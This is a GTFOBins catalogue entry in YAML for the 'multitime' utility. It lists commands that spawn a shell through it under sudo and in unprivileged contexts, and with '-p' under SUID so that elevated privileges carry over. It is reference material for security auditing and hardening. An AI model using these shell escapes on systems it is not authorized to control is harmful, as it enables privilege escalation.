<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/multitime -->
---
functions:
  shell:
  - code: |-
      multitime /bin/sh
    contexts:
      sudo:
      suid:
        code: |-
          multitime /bin/sh -p
      unprivileged:
...
